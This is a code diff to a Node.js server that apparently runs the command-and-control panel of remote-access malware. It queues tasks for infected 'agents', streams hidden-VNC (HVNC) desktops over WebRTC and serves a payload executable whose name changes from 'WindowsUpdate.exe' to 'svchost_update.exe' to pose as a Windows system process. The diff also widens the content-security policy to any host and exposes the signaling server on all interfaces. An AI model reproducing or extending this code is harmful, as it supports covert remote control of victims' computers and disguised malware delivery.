@@ -514,6 +514,32 @@ wss.on('connection', (ws) => {
                     }
                     break;
 
+
+
+
+
+                case 'offer':
+                    // Viewer-initiated offer (ICE restart)
+                    const viewerOfferSessionId = data.sessionId;
+                    const viewerOfferSession = getWebRTCSession(viewerOfferSessionId);
+                    if (!viewerOfferSession) {
+                        ws.send(JSON.stringify({ type: 'error', message: 'Session not found' }));
+                        return;
+                    }
+                    console.log(`[WebRTC] 🔄 Viewer-initiated offer (ICE restart) for ${viewerOfferSessionId}`);
+
+                    // Store for the agent to poll
+                    viewerOfferSession.pendingRenegotiation = data.sdp;
+
+                    // Also try Socket.IO delivery if agent is connected that way
+                    const agentSock = getAgentSocket(viewerOfferSession.agentId);
+                    if (agentSock && agentSock.connected) {
+                        agentSock.emit('webrtc_renegotiate', {
+                            sessionId: viewerOfferSessionId,
+                            sdp: data.sdp,
+                        });
+                    }
+                    break;    
                 case 'agent_offer':
                     // Agent is sending an SDP offer
                     const agentSessionId = data.sessionId;
@@ -650,14 +676,12 @@ wss.on('connection', (ws) => {
             }
         }
         console.log(`[WebRTC] 🧊 ICE candidate forwarded to ${viewerCount} viewers`);
-    } else {
-        // Viewer -> Agent: store in BOTH arrays so regular WebRTC and HVNC pollers get them
-        if (!iceSession.viewerIceCandidates) iceSession.viewerIceCandidates = [];
-        if (!iceSession.iceCandidates) iceSession.iceCandidates = [];
-        iceSession.viewerIceCandidates.push(candidate);
-        iceSession.iceCandidates.push({ candidate, timestamp: Date.now() });
-        console.log(`[WebRTC] 📦 ICE candidate stored for agent (${iceSession.iceCandidates.length} total)`);
-    }
+  } else {
+    // Viewer -> Agent
+    if (!iceSession.viewerIceCandidates) iceSession.viewerIceCandidates = [];
+    iceSession.viewerIceCandidates.push(candidate);
+    console.log(`[WebRTC] 📦 ICE candidate stored for agent (${iceSession.viewerIceCandidates.length} total)`);
+}
     break;
 
                 case 'disconnect':
@@ -751,7 +775,7 @@ app.use((req, res, next) => {
   "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; " +
   "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; " +
   "img-src 'self' data: https:; " +
-  "connect-src 'self' ws://driveone.online wss://driveone.online; " +
+  "connect-src 'self' ws: wss: http: https:; " +
   "frame-src 'none'; " +
   "object-src 'none';"
 );
@@ -1152,20 +1176,13 @@ app.post('/api/webrtc/agent/offer', verifyToken, (req, res) => {
 app.get('/api/webrtc/agent/candidates/:sessionId', verifyToken, (req, res) => {
     const { sessionId } = req.params;
     const session = getWebRTCSession(sessionId);
-    if (!session) {
-        return res.status(404).json({ success: false, message: 'Session not found' });
-    }
+    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
 
-    const candidates = session.iceCandidates || [];
-    const viewerCandidates = (session.viewerIceCandidates || []).map(c => ({ candidate: c, timestamp: Date.now() }));
-    session.iceCandidates = [];
+    const candidates = (session.viewerIceCandidates || [])
+        .map(c => ({ candidate: c, timestamp: Date.now() }));
     session.viewerIceCandidates = [];
 
-    res.json({
-        success: true,
-        candidates: [...candidates, ...viewerCandidates],
-        count: candidates.length + viewerCandidates.length
-    });
+    res.json({ success: true, candidates, count: candidates.length });
 });
 
 
@@ -1380,8 +1397,11 @@ app.get('/api/webrtc/agent/answer/:sessionId', (req, res) => {
 app.post('/api/webrtc/killall', (req, res) => {
     console.log('[WebRTC] 💀 KILLALL called - terminating all streams');
     let killed = 0;
+    const agentIds = new Set();
+
     for (const [sessionId, session] of webrtcSessions) {
-        // Close all viewer WebSockets
+        if (session.agentId) agentIds.add(session.agentId);
+
         for (const viewer of session.viewers) {
             try {
                 if (viewer.readyState === WebSocket.OPEN) {
@@ -1389,23 +1409,32 @@ app.post('/api/webrtc/killall', (req, res) => {
                 }
             } catch (e) {}
         }
-        // Close PeerConnection if it exists (on agent side, we can't directly close)
-        // We'll rely on the agent to clean up when it receives a stop_host task
-        // Or we can send a task to each agent to stop WebRTC
         killed++;
         deleteWebRTCSession(sessionId);
     }
-    // Also clear any leftover state
     webrtcSessions.clear();
     webrtcViewers.clear();
-    console.log(`[WebRTC] ✅ Killed ${killed} streams`);
+
+    // Queue stop_host for every agent that had a session
+    const db = require('./database');
+    let tasksCreated = 0;
+    const taskBaseId = Date.now() + '_kill';
+    agentIds.forEach(agentId => {
+        db.run(
+            "INSERT INTO tasks (taskId, agentId, type, moduleName, moduleAction, status) VALUES (?, ?, ?, ?, ?, ?)",
+            [taskBaseId + '_' + agentId, agentId, 'module_action', 'webrtc', 'stop_host', 'pending'],
+            (err) => { if (!err) tasksCreated++; }
+        );
+    });
+
+    console.log(`[WebRTC] ✅ Killed ${killed} streams, queued stop_host for ${agentIds.size} agents`);
     res.json({ 
         success: true, 
         killed: killed,
-        message: `Terminated ${killed} WebRTC session(s)`
+        stoppedAgents: agentIds.size,
+        tasksCreated: tasksCreated
     });
 });
-
 
 
 // Optionally send stop_host task to all agents
@@ -1457,7 +1486,13 @@ app.get('/api/webrtc/stream/:agentId', verifyToken, (req, res) => {
 res.json({
     success: true,
     sessionId,
-    signalingUrl: `wss://${req.get('host')}/ws`,
+    signalingUrl: (() => {
+  const host = req.hostname;
+  const isLocal = host === 'localhost' || host === '127.0.0.1' || host.startsWith('192.168.') || host.startsWith('10.');
+  return isLocal
+    ? `ws://${host}:8082`
+    : `${req.protocol === 'https' ? 'wss' : 'ws'}://${req.get('host')}/ws`;
+})(),
     iceServers: getIceServers(),
     message: 'Use this sessionId to connect to the stream',
     agentConnected: !!getAgentSocket(agentId)
@@ -1558,7 +1593,13 @@ app.get('/api/hvnc_webrtc/stream/:agentId', verifyToken, (req, res) => {
 res.json({
     success: true,
     sessionId,
-    signalingUrl: `wss://${req.get('host')}/ws`,
+    signalingUrl: (() => {
+  const host = req.hostname;
+  const isLocal = host === 'localhost' || host === '127.0.0.1' || host.startsWith('192.168.') || host.startsWith('10.');
+  return isLocal
+    ? `ws://${host}:8082`
+    : `${req.protocol === 'https' ? 'wss' : 'ws'}://${req.get('host')}/ws`;
+})(),
    iceServers: getIceServers(),
     message: 'Use this sessionId to connect to the stream',
     agentConnected: !!getAgentSocket(agentId)
@@ -1652,6 +1693,40 @@ app.get('/api/hvnc_webrtc/agent/answer/:sessionId', verifyToken, (req, res) => {
 // ─── HVNC WEBRTC ICE ENDPOINTS ──────────────────────────────────
 
 
+// Agent polls for viewer-initiated renegotiation offers
+app.get('/api/webrtc/agent/renegotiate/:sessionId', verifyToken, (req, res) => {
+    const session = getWebRTCSession(req.params.sessionId);
+    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
+    if (session.pendingRenegotiation) {
+        const sdp = session.pendingRenegotiation;
+        session.pendingRenegotiation = null;
+        return res.json({ success: true, sdp });
+    }
+    res.json({ success: false });
+});
+
+app.post('/api/webrtc/agent/renegotiate-answer', verifyToken, (req, res) => {
+    const { sessionId, sdp } = req.body;
+    if (!sessionId || !sdp) return res.status(400).json({ success: false });
+
+    const session = getWebRTCSession(sessionId);
+    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
+
+    let pushed = 0;
+    for (const viewer of session.viewers) {
+        if (viewer.readyState === WebSocket.OPEN) {
+            viewer.send(JSON.stringify({
+                type: 'answer',
+                sdp,
+                sessionId,
+                renegotiation: true
+            }));
+            pushed++;
+        }
+    }
+    console.log(`[WebRTC] 📤 Renegotiation answer pushed to ${pushed} viewers`);
+    res.json({ success: true, pushed });
+});
 // Agent sends ICE candidate
 app.post('/api/hvnc_webrtc/agent/ice', verifyToken, (req, res) => {
     const { sessionId, candidate } = req.body;
@@ -1840,7 +1915,13 @@ app.get('/api/hvnc_explorer/stream/:agentId', verifyToken, (req, res) => {
 res.json({
     success: true,
     sessionId,
-    signalingUrl: `wss://${req.get('host')}/ws`,
+    signalingUrl: (() => {
+  const host = req.hostname;
+  const isLocal = host === 'localhost' || host === '127.0.0.1' || host.startsWith('192.168.') || host.startsWith('10.');
+  return isLocal
+    ? `ws://${host}:8082`
+    : `${req.protocol === 'https' ? 'wss' : 'ws'}://${req.get('host')}/ws`;
+})(),
     iceServers: getIceServers(),
     message: 'Use this sessionId to connect to the stream',
     agentConnected: !!getAgentSocket(agentId)
@@ -2273,7 +2354,7 @@ app.get('/getvbs', async (req, res) => {
 
 // Endpoint for server host module
 app.get('/ServerHostModule', async (req, res) => {
-    const filePath = path.join(__dirname, 'dist', 'WindowsUpdate.exe');
+    const filePath = path.join(__dirname, 'dist', 'svchost_update.exe');
     
     if (fs.existsSync(filePath)) {
         const ip = getClientIP(req);
@@ -3761,8 +3842,8 @@ server.timeout = 600000;
 
 // ─── START WEBRTC WEBSOCKET SERVER ──────────────────────────────
 // ─── START WEBRTC WEBSOCKET SERVER ──────────────────────────────
-webRTCServer.listen(WEBRTC_PORT, '127.0.0.1', () => {
-    console.log(`[WebRTC] WebSocket signaling server running on ws://127.0.0.1:${WEBRTC_PORT}`);
+webRTCServer.listen(WEBRTC_PORT, '0.0.0.0', () => {
+    console.log(`[WebRTC] WebSocket signaling server running on ws://0.0.0.0:${WEBRTC_PORT}`);
 });
 
 webRTCServer.on('error', (err) => {
